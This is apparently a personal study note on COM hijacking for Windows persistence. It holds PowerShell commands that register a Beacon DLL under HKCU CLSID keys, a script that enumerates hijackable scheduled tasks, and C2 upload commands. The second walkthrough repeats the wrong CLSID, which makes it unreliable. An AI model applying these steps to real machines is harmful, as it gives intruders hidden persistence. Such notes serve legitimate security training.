---
creation date: September 22nd 2022
last modified date: September 22nd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[COM Hijacks]]  
___

## Description:  
Used for persistence on a compromised machine.

Component Object Model (COM) is a technology built within the Windows operating system that allows intercommunication between software components of different languages.

COM hijacking comes into play when we are able to modify these entries to point to a different DLL - one that we control. So that when an application tries to call a particular coclass, instead of loading `C:\Windows\System32\ieframe.dll` (for example), it will load `C:\Temp\evil.dll` or whatever we specify.

The danger with hijacking COM objects like this is that you **will** break functionality. Hijacking a COM object without an understanding of what it does or what it's for is a very bad idea in a live environment.


### Hunting for COM Hijacks

[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is part of the excellent [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). It shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives. Launch **procmon64.exe** on **Attacker Windows**.

Due to the sheer number of events generated, filtering is essential to find the ones of interest. We're looking for:

-   **RegOpenKey** operations.
-   where the _Result_ is **NAME NOT FOUND**.
-   and the _Path_ ends with **InprocServer32**.

To speed the collection up you click random things, go into the Windows menu, launch applications etc. After just a few minutes, I have over 5,000 events - most of them from Explorer, some from 3rd party software and others from OS components.

find one that's loaded semi-frequently but not so much so, or loaded when a commonly-used application (Word, Excel, Outlook etc) is opened.


We can use some quick PowerShell to show that the entry does exist in HKLM, but not in HKCU.

```
PS C:\> Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
                               ThreadingModel : Apartment


PS C:\> Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32' because it does not exist.
```

To exploit this, we can create the necessary registry entries in HKCU and point them at a Beacon DLL.
```
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
PS C:\> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

To generate the DLL, go to **Attacks > Packages > Windows Executable (S)** and select **Windows DLL** as the output type. Then upload the DLL to the location we specified in the registry entry above.

```
beacon> cd C:\
beacon> upload C:\Payloads\beacon.dll
```

### Using Task Scheduler to look for Hijackable COM components

We can use the following PowerShell to find compatible tasks.

```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

Use task scheduler to see how often these tasks run

```
PS C:\> Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\MsCtfMonitor.dll
               ThreadingModel : Both
```

```
PS C:\> Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler


PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

To exploit this, we can create the necessary registry entries in HKCU and point them at a Beacon DLL.

```
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
PS C:\> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

To generate the DLL, go to **Attacks > Packages > Windows Executable (S)** and select **Windows DLL** as the output type. Then upload the DLL to the location we specified in the registry entry above.

```
beacon> cd C:\
beacon> upload C:\Payloads\beacon.dll
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 22nd 2022 (07:32 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
